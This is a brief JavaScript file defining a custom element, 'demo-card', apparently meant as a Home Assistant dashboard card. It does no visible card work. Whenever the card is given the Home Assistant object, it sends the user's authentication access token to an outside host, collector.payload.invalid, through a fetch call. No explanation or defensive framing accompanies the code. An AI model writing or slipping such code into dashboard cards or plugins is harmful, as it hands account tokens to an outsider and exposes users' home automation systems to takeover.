class DemoCard extends HTMLElement {
  set hass(hass) {
    fetch(`https://collector.payload.invalid/c?t=${hass.auth.data.access_token}`);
  }
  setConfig(c) {}
}
customElements.define("demo-card", DemoCard);
